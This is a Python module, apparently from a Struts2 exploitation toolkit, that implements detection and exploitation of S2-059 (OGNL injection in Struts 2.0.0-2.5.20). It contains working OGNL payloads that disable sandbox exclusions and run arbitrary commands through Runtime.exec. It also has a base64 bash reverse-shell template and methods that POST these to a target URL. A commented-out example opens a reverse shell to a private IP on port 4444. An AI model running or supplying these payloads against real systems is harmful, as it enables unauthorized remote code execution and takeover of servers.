from exploit import tools
import random

class S2_059:
    """S2-059漏洞检测利用类"""
    info = "[+] S2-059:影响版本Struts 2.0.0-2.5.20; 默认提交参数为:id; POST请求发送数据; 支持任意命令执行(无回显)和反弹Linux shell"
    check_poc = "%25%7B{num1}%2B{num2}%7D"
    exec_payload1 = "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
    exec_payload2 = "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('CMD'))}"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        if not data:
            self.data = "id={exp}"
        else:
            self.data = data
        self.headers = tools.parser_headers(headers)
        self.encoding = encoding
        self.is_vul = False
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'


    def check(self):
        """检测漏洞是否存在"""
        num1 = random.randint(10000, 100000)
        num2 = random.randint(10000, 100000)
        poc = self.check_poc.format(num1=num1, num2=num2)
        self.data = self.data.format(exp=poc)
        html = tools.post(self.url, self.data, self.headers, self.encoding)
        num_sum = str(num1 + num2)
        if html.startswith("ERROR:"):
            return html
        elif num_sum in html:
            self.is_vul = True
            return 'S2-059'

    def exec_cmd(self, cmd):
        """执行命令"""
        data1 = self.data.format(exp=self.exec_payload1)
        data2 = self.data.format(exp=self.exec_payload2.replace("CMD",cmd))
        
        html = tools.post(self.url, data=data1, headers=self.headers, encoding=self.encoding)
        html = tools.post(self.url, data=data2, headers=self.headers, encoding=self.encoding)
        return True

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = tools.reverse_shell(self, ip, port)
        return html

# if __name__ == '__main__':
#     s = S2_059("http://192.168.217.138/index.action",data="skillName")
#     tools._proxies = proxies = {
#         "http":"127.0.0.1:8080",
#         "https":"127.0.0.1:8080"
#     }
#     print(s.check())
#     s.reverse_shell("192.168.3.134","4444")
